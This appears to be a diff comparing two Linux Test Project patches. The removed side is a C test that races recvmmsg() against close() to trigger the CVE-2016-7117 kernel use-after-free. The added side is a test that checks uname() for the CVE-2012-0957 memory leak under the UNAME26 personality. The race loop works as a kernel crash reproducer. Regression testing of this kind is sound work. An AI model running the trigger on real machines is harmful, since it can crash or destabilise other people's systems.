@@ -1,28 +1,31 @@
 From: Richard Palethorpe <rpalethorpe@suse.com>
-Date: Thu, 23 Mar 2017 16:26:29 +0100
-Subject: [LTP] [PATCH 1/4] Test for vulnerability CVE-2016-7117 in recvmmsg
- error return path
-Message-ID: <20170323162629.56c4d2d6@linux-v3j5>
+Date: Thu, 23 Mar 2017 16:26:38 +0100
+Subject: [LTP] [PATCH 3/4] Test for uname26 exploit CVE-2012-0957
+Message-ID: <20170323162638.6fea756b@linux-v3j5>
 List-Id: <ltp.lists.linux.it>
 MIME-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 To: ltp@lists.linux.it
 
+Attempt to exploit the uname kernel memory leak which occurred when the
+UNAME26 personality was set.
+
 Signed-off-by: Richard Palethorpe <rpalethorpe@suse.com>
 ---
- testcases/cve/cve-2016-7117.c | 191 ++++++++++++++++++++++++++++++++++++++++++
- 1 file changed, 191 insertions(+)
- create mode 100644 testcases/cve/cve-2016-7117.c
+ testcases/cve/cve-2012-0957.c | 90 +++++++++++++++++++++++++++++++++++++++++++
+ 1 file changed, 90 insertions(+)
+ create mode 100644 testcases/cve/cve-2012-0957.c
 
-diff --git a/testcases/cve/cve-2016-7117.c b/testcases/cve/cve-2016-7117.c
+diff --git a/testcases/cve/cve-2012-0957.c b/testcases/cve/cve-2012-0957.c
 new file mode 100644
-index 000000000..2a34c369e
+index 000000000..3a2afe08e
 --- /dev/null
-+++ b/testcases/cve/cve-2016-7117.c
-@@ -0,0 +1,191 @@
++++ b/testcases/cve/cve-2012-0957.c
+@@ -0,0 +1,90 @@
 +/*
 + * Copyright (c) 2017 Richard Palethorpe <rpalethorpe@suse.com>
++ * Copyright (c) 2012, Kees Cook <keescook@chromium.org>
 + *
 + * This program is free software: you can redistribute it and/or modify
 + * it under the terms of the GNU General Public License as published by
@@ -38,179 +41,77 @@ index 000000000..2a34c369e
 + * along with this program. If not, see <http://www.gnu.org/licenses/>.
 + */
 +/*
-+ * CVE-2016-7117
++ * Check that memory after the string terminator in all the utsname fields has
++ * been zeroed. cve-2012-0957 leaked kernel memory through the release field
++ * when the UNAME26 personality was set.
 + *
-+ * This tests for a use after free caused by a race between recvmmsg() and
-+ * close(). The exit path for recvmmsg() in (a2e2725541f: net: Introduce
-+ * recvmmsg socket syscall) called fput() on the active file descriptor before
-+ * checking the error state and setting the socket's error field.
-+ *
-+ * If one or more messages are received by recvmmsg() followed by one which
-+ * fails, the socket's error field will be set. If just after recvmmsg() calls
-+ * fput(), a call to close() is made on the same file descriptor there is a
-+ * race between close() releasing the socket object and recvmmsg() setting its
-+ * error field.
-+ *
-+ * fput() does not release a file descriptor's resources (e.g. a socket)
-+ * immediatly, it queues them to be released just before a system call returns
-+ * to user land. So the close() system call must call fput() after it is
-+ * called in recvmmsg(), exit and release the resources all before the socket
-+ * error is set.
-+ *
-+ * Usually if the vulnerability is present the test will be killed with a
-+ * kernel null pointer exception. However this is not guaranteed to happen
-+ * every time. To maximise the chance of the race occuring the test tries to
-+ * align the exit times of the final close() and recvmmsg() plus an offset. It
-+ * takes a moving average and uses it to adjust a delay by nanosleep().
-+ *
-+ * The following was used for reference
-+ * https://blog.lizzie.io/notes-about-cve-2016-7117.html
++ * Thanks to Kees Cook for the original proof of concept:
++ * http://www.securityfocus.com/bid/55855/info
 + */
 +
-+#include <sys/wait.h>
-+#include <sys/types.h>
-+#include <sys/socket.h>
-+#include <sys/syscall.h>
-+#include <stdlib.h>
-+#include <errno.h>
-+
++#include <string.h>
++#include <sys/utsname.h>
++#include <sys/personality.h>
 +#include "tst_test.h"
-+#include "tst_safe_net.h"
-+#include "tst_safe_pthread.h"
-+#include "tst_timer.h"
 +
-+/* The bug was present in the kernel before recvmmsg was exposed by glibc */
-+#include "linux_syscall_numbers.h"
++#define UNAME26 0x0020000
 +
-+#ifndef CLOCK_MONOTONIC_RAW
-+#define CLOCK_MONOTONIC_RAW CLOCK_MONOTONIC
-+#endif
++static int check_field(char *bytes, size_t length, char *field)
++{
++	size_t i = strlen(bytes) + 1;
 +
-+#define MSG "abcdefghijklmnop"
-+#define RECV_TIMEOUT 1
-+#define ATTEMPTS 0x1FFFFF
-+#define TARGET_AVG_TDIFF (-1000.0d)
-+#define ALPHA (0.25d)
-+
-+static int socket_fds[2];
-+static struct mmsghdr msghdrs[2] = {
-+	{
-+		.msg_hdr = {
-+			.msg_iov = &(struct iovec) {
-+				.iov_len = sizeof(MSG),
-+			},
-+			.msg_iovlen = 1
-+		}
-+	},
-+	{
-+		.msg_hdr = {
-+			.msg_iov = &(struct iovec) {
-+				.iov_base = (void *)(0xbadadd),
-+				.iov_len = ~0,
-+			},
-+			.msg_iovlen = 1
++	for (; i < length; i++) {
++		if (bytes[i]) {
++			tst_res(TFAIL, "Bytes leaked in %s!", field);
++			return 1;
 +		}
 +	}
-+};
-+static char rbuf[sizeof(MSG)];
-+static struct timespec timeout = { .tv_sec = RECV_TIMEOUT };
-+static struct timespec close_exit;
-+static struct timespec recvmmsg_exit;
-+
-+static void cleanup(void)
-+{
-+	close(socket_fds[0]);
-+	close(socket_fds[1]);
-+}
-+
-+static inline void exit_time(struct timespec *t)
-+{
-+	clock_gettime(CLOCK_MONOTONIC_RAW, t);
-+}
-+
-+static void *send_and_close(void *arg)
-+{
-+	struct timespec *delay = (struct timespec *)arg;
-+
-+	send(socket_fds[0], MSG, sizeof(MSG), 0);
-+	send(socket_fds[0], MSG, sizeof(MSG), 0);
-+
-+	nanosleep(delay, 0);
-+
-+	close(socket_fds[0]);
-+	close(socket_fds[1]);
-+	exit_time(&close_exit);
-+
 +	return 0;
 +}
 +
-+static void run(void)
++
++static void try_leak_bytes(void)
 +{
-+	pthread_t pt_send;
-+	int i, stat, too_early_count = 0;
-+	long tdiff = 0, delay = 0;
-+	double avg_tdiff = 0;
-+	struct timespec recv_delay = {0}, clos_delay = {0};
++	struct utsname buf;
 +
-+	msghdrs[0].msg_hdr.msg_iov->iov_base = (void *)&rbuf;
++	if (uname(&buf))
++		tst_brk(TBROK | TERRNO, "Call to uname failed");
 +
-+	for (i = 1; i < ATTEMPTS; i++) {
-+		if (socketpair(AF_LOCAL, SOCK_DGRAM, 0, socket_fds))
-+			tst_brk(TBROK | TERRNO, "Socket creation failed");
++#define CHECK_FIELD(field_name) \
++	(check_field(buf.field_name, ARRAY_SIZE(buf.field_name), #field_name))
 +
-+		SAFE_PTHREAD_CREATE(&pt_send, 0, send_and_close, &clos_delay);
-+
-+		nanosleep(&recv_delay, 0);
-+
-+		stat = tst_syscall(__NR_recvmmsg,
-+				   socket_fds[1], msghdrs, 2, 0, &timeout);
-+		exit_time(&recvmmsg_exit);
-+		if (stat < 0 && errno == EBADF)
-+			too_early_count++;
-+		else if (stat == 0)
-+			tst_res(TWARN, "No messages received, should be one");
-+		else if (stat < 0)
-+			tst_res(TWARN | TERRNO, "recvmmsg failed unexpectedly");
-+
-+		SAFE_PTHREAD_JOIN(pt_send, 0);
-+
-+		tdiff = recvmmsg_exit.tv_nsec - close_exit.tv_nsec;
-+		avg_tdiff = ALPHA * tdiff + (1.0d - ALPHA) * avg_tdiff;
-+		if (!(i & 0xF)) {
-+			if (avg_tdiff < TARGET_AVG_TDIFF)
-+				delay++;
-+			else if (avg_tdiff > TARGET_AVG_TDIFF)
-+				delay--;
-+
-+			if (delay > 0) {
-+				recv_delay.tv_nsec = delay;
-+				clos_delay.tv_nsec = 1;
-+			} else if (delay < 0) {
-+				recv_delay.tv_nsec = 1;
-+				clos_delay.tv_nsec = -delay;
-+			} else {
-+				recv_delay.tv_nsec = 1;
-+				clos_delay.tv_nsec = 1;
-+			}
-+		}
-+
-+		if (!(i & 0x7FFFF)) {
-+			tst_res(TINFO, "Early: %.1f%%, diff: %ldns, avg_tdiff: %.5gns",
-+				100 * too_early_count / (float)i,
-+				tdiff, avg_tdiff);
-+			tst_res(TINFO, "Receive delay: %ldns, close delay: %ldns",
-+				recv_delay.tv_nsec, clos_delay.tv_nsec);
-+		}
++	if (!(CHECK_FIELD(release) |
++	    CHECK_FIELD(sysname) |
++	    CHECK_FIELD(nodename) |
++	    CHECK_FIELD(version) |
++	    CHECK_FIELD(machine) |
++#ifdef _GNU_SOURCE
++	    CHECK_FIELD(domainname) |
++#endif
++		    0)) {
++		tst_res(TPASS, "All fields zeroed after string terminator");
 +	}
++#undef CHECK_FIELD
++}
 +
-+	tst_res(TPASS, "Nothing happened after %d attempts", ATTEMPTS);
++static void run(unsigned int test_nr)
++{
++	if (!test_nr) {
++		tst_res(TINFO, "Calling uname with default personality");
++		try_leak_bytes();
++	} else {
++		if (personality(PER_LINUX | UNAME26) < 0)
++			tst_brk(TCONF | TERRNO,
++				"Could not change personality to UNAME26");
++		tst_res(TINFO, "Calling uname with UNAME26 personality");
++		try_leak_bytes();
++	}
 +}
 +
 +static struct tst_test test = {
-+	.tid = "cve-2016-7117",
-+	.test_all = run,
-+	.cleanup = cleanup,
-+	.min_kver = "2.6.33",
++	.tid = "cve-2012-0957",
++	.test = run,
++	.tcnt = 2,
 +};
 -- 
 2.12.0
